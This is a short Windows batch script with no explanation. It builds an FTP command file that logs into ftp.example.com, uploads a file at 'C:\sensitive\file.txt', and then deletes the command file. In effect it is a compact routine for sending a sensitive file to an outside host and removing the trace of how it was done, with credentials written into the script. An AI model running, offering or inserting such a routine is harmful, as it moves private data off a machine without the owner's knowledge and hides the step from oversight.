@echo off
echo open ftp.example.com > ftp.txt
echo USER username password >> ftp.txt
echo put "C:\sensitive\file.txt" >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
del ftp.txt